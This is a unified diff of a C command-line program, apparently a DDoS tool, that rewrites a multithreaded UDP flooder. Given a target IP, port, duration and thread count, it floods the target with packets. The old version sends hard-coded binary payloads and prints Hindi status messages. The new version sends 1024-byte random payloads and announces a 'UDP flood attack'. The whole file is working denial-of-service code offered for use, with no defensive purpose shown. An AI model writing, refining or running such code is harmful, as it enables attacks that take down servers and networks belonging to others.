@@ -2,112 +2,114 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <arpa/inet.h>
 #include <pthread.h>
+#include <arpa/inet.h>
 #include <time.h>
 
-void usage() {
-    printf("Usage: ./rohit ip port time threads\n");
-    exit(1);
+// Constants
+#define PAYLOAD_SIZE 1024  // Size of UDP payload
+#define MAX_THREADS 100    // Maximum threads allowed
+#define MIN_THREADS 1      // Minimum threads allowed
+
+// Function prototype
+void *udp_flood(void *arg);
+
+// Structure for thread arguments
+typedef struct {
+    char *target_ip;
+    int target_port;
+    int duration;
+    int thread_id;
+} ThreadArgs;
+
+void generate_payload(char *payload, size_t size) {
+    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    size_t chars_len = strlen(chars);
+
+    for (size_t i = 0; i < size; ++i) {
+        payload[i] = chars[rand() % chars_len];
+    }
 }
 
-struct thread_data {
-    char *ip;
-    int port;
-    int time;
-};
+void *udp_flood(void *arg) {
+    ThreadArgs *args = (ThreadArgs *)arg;
 
-void *attack(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    time_t endtime;
-
-    char *payloads[] = {
-        "\x1C\x2B\x93\x2B\x82\x37\x58\x99\xFF\x1E\x84\xBF\x18\xD5\xB0\x6C\x73\x03\xFF\x93\xEE\xD1\x47\x57\xAF\x88\x20\xB9\x3F\x3E\x0F\x0D\x2F\xF1\x9C\xCC\x15\x19\x0D\xF7\x13\x31\x38\xBB\xD8\xC5\xA4\xD4\xAF\x6C\x15\x33\xA7\x24\x66\xE6\xB9\x1A\x71\xD4\xF0\x02\x8B\xF6\xC5\x66\xB1\xC3\x18\x11\x0E\x08\x86\x59\xCC\x0A\x80\x28\x7E\x85\x61\x54\x1D\xE4\x42\x50\x49\x1B\x6", 
-       
-       
-"\x1C\x2B\x93\x2B\x9E\x37\x5F\x49\x43\xEF\x62\xDE\xA7\x3D\xD3\xED\xB1\x8A\xA2\xAD\x5F\x42\x7F\x3E\x87\xB6\xDC\x73\x44\x8B\x5C\x8F\x39\xD7\x0C\x2D\x63\x3D\x31\x85\x0D\xD8\xB7\x77\x9F\xD7\x86\xCB\x3E\xEE\xDD\x71\x83\x02\x14\xF5\xD0\x93\xFD\x90\x42\x20\xE4\x67\x7F\xAE\xEF\xE7\x30\x63\x1A\xE1\x0C\x15\x89\x58\xA5\x97\xEC\xD7\xA8\xFE\x39\xB6\x30\x79\x20\x8F\x63\x2D\xEC\x0C\xD4\xF0\x24\x35\x91\x23\x7D\x6C\xEF\x20\x58\x11\x9B\x56\xE8\xD1\x2A\xF8\x48\xA6\xB7\x3D\xE3\x34\xF3\x7B\x82\xAE\xAF\x6A\xEA\x49\x07\x70\xC9\xC2\xE0\xFA\x13\x14\x4D\xB2\xCC\x6F\xE0\x55\xDA\x56\xFE\x3E\xC7\xDD\x95\xC6\x58\x1F\x00\xEC\xA3\x34\x6D\x8F\xBC\xBE\xA0\xC9\x34\x78\x3D\x9E\xCF\xC5\xD7\x37\x10\xAF\xCE\x2F\x5C\x82\xD9\x43\x3F\x26\x8B\x74\xF7\x46", 
-        "\x1C\x2B\x93\x2B\x8A\x37\x47\x49\x23\xCC\x3F\x0A\x95\xAF\xB6\x79\x71\x1B\xFE\x17\xEE\x9F\x47\x76\x2F\x99\x60\xB1\xDF\x3B\x1F\x0F\x37\xF0\x18\xCC\x5B\x19\x2C\x77\x02\x71\x30\x5B\xDF\xD5\xA6\xCC\xAE\xE8\x15\x7D\xA7\x05\xE6\xF7\xF9\x12\x01\xD0\x7D\x2F\x16\xAC\x8E\x0E\x9C\x93\x3C\xD1\x1A\xBC\x49\xED\xA6\x87\x26\x4D\x3D\xE8\x60\xE6\x9D\xB8\xAA\xF2\xE7\xBC\x8D\x2F\x4E\x8A\x4D\x30\x55\x75\x10\xC3\xE3\xD1\xE3\x7E\x4A\x18\x66\xB7\x5B\xD0\xBE\xB6\xB0\xD1\x8B\xB3\xC2\xE4\xA2\xB1\x8C\xBE\x78\xEF\xDB\xDA\x5E\x9C\xD4\x8F\xA7\x28\x5A\xEF\x40\xAF\x8B\x84\x90\xAD\xEE\x2E\x95", 
-        "\xF8\x2F\x1D\xC3\x6E\x67\x8B\x48\x41\xBA\x86\x0C\x27\x2F\xB3\xE6\xCA\x08\x8E\x58\x8D\xA5\x93\x40\x09\x3A\x93\x02\xF9\x39\xE2\xA1\x2C\x83\x37\xF8\xD4\x45\x37\x0C\x64\x12\x4C\xC1\xDC",
-        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
-        "\x98\x2F\xB5\xC2\xEE\xB3\x01\x69\x23\xF6\x87\xCD\x0D\xE3\x44\x8A\xEF\xC5\x4C\x14\xCE\x2F\xA3\xBE\x47\xCA\xCE\xAA\x3B\x24\x2C\xBD\xCB\xF9\xB3\xC1\xBC\x40\xB6\x77\x04\x85\x36\x41\xD0\x84\x62\xB9\xEC\x21\xA1\x94",
-         
-        
-        "\xE0\x2F\xB5\xC2\xEE\x89\x01\x5A\x23\xF6\x87\x46\x0E\xE3\x5B\xFA\xEF\xC5\x4C\x14\xCE\x2F\xA3\xBE\x47\xCA\xCE\x82\xEB\x76\x82\x89",
-    };
-
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+    // Create UDP socket
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    server_addr.sin_addr.s_addr = inet_addr(data->ip);
+    // Set up target address
+    struct sockaddr_in target_addr;
+    memset(&target_addr, 0, sizeof(target_addr));
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(args->target_port);
 
-    endtime = time(NULL) + data->time;
+    if (inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr) <= 0) {
+        perror("Invalid IP address");
+        close(sock);
+        pthread_exit(NULL);
+    }
 
-    while (time(NULL) <= endtime) {
-        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
-            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
-                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                perror("Send failed");
-                close(sock);
-                pthread_exit(NULL);
-            }
+    // Generate random payload
+    char payload[PAYLOAD_SIZE];
+    generate_payload(payload, PAYLOAD_SIZE);
+
+    // Start flooding
+    printf("[Thread %d] Flooding %s:%d for %d seconds...\n", args->thread_id, args->target_ip, args->target_port, args->duration);
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < args->duration) {
+        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
+            perror("[Thread] Send failed");
         }
     }
 
     close(sock);
-    free(data); // आवंटित मेमोरी को मुक्त करना
+    printf("[Thread %d] Completed flood.\n", args->thread_id);
     pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        usage();
+        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
+    char *target_ip = argv[1];
+    int target_port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
     int threads = atoi(argv[4]);
 
-    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
-    if (thread_ids == NULL) {
-        perror("थ्रेड IDs के लिए मेमोरी आवंटन विफल हुआ");
-        exit(1);
+    if (threads < MIN_THREADS || threads > MAX_THREADS) {
+        printf("Error: Threads must be between %d and %d.\n", MIN_THREADS, MAX_THREADS);
+        return EXIT_FAILURE;
     }
 
-    printf("Flood शुरू हुआ %s:%d पर %d सेकंड के लिए %d थ्रेड्स के साथ\n", ip, port, time, threads);
+    printf("Starting UDP flood attack on %s:%d with %d threads for %d seconds...\n", target_ip, target_port, threads, duration);
 
-    for (int i = 0; i < threads; i++) {
-        struct thread_data *data = malloc(sizeof(struct thread_data));
-        if (data == NULL) {
-            perror("थ्रेड डेटा के लिए मेमोरी आवंटन विफल हुआ");
-            free(thread_ids);
-            exit(1);
+    pthread_t thread_pool[threads];
+    ThreadArgs thread_args[threads];
+
+    // Initialize threads
+    for (int i = 0; i < threads; ++i) {
+        thread_args[i].target_ip = target_ip;
+        thread_args[i].target_port = target_port;
+        thread_args[i].duration = duration;
+        thread_args[i].thread_id = i + 1;
+
+        if (pthread_create(&thread_pool[i], NULL, udp_flood, &thread_args[i]) != 0) {
+            perror("Failed to create thread");
+            return EXIT_FAILURE;
         }
-        data->ip = ip;
-        data->port = port;
-        data->time = time;
-
-        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
-            perror("थ्रेड निर्माण विफल हुआ");
-            free(data);
-            free(thread_ids);
-            exit(1);
-        }
-        printf("लॉन्च किया गया थ्रेड ID: %lu\n", thread_ids[i]);
     }
 
-    for (int i = 0; i < threads; i++) {
-        pthread_join(thread_ids[i], NULL);
+    // Wait for threads to finish
+    for (int i = 0; i < threads; ++i) {
+        pthread_join(thread_pool[i], NULL);
     }
 
-    free(thread_ids);
-    printf("अटैक समाप्त हुआ\n");
-    return 0;
+    printf("UDP flood attack completed.\n");
+    return EXIT_SUCCESS;
 }
